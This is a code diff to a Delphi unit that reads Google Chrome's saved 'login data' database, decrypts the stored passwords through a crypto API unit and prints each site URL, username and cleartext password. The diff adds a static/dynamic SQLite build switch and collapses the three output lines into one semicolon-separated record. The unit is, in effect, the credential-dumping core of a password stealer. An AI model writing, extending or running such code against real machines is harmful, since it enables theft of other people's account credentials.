@@ -1,15 +1,16 @@
 unit uchrome;
 
 {$mode delphi}
+{.$define static}
 
 interface
 
 uses
   sysutils,windows,
   //static
-  {synsqlite3static,}
+  {$ifdef static}synsqlite3static,{$endif}
   //or dynamic
-  SynSQLite3,
+  {$ifndef static}SynSQLite3,{$endif}
   syndb,syndbsqlite3,
   shlobj,
   ucryptoapi,utils;
@@ -61,7 +62,9 @@ path:=path+'\Google\Chrome\User Data\Default';
 
   try
     //if dynamic
+    {$ifndef static}
     sqlite3 := TSQLite3LibraryDynamic.Create(SQLITE_LIBRARY_DEFAULT_NAME);
+    {$endif}
     //
     props:=TSQLDBSQLite3ConnectionProperties.Create(pchar(path+'\login data.db'),'','','');
 
@@ -79,9 +82,12 @@ path:=path+'\Google\Chrome\User Data\Default';
          begin
          if length(output)<255 then
          begin
+         {
          writeln(rows['origin_url']);
          writeln((rows['username_value']));
          writeln(BytetoAnsiString(output));
+         }
+         writeln(rows['origin_url']+';'+rows['username_value']+';'+BytetoAnsiString(output));
          end;
          end;
       end;
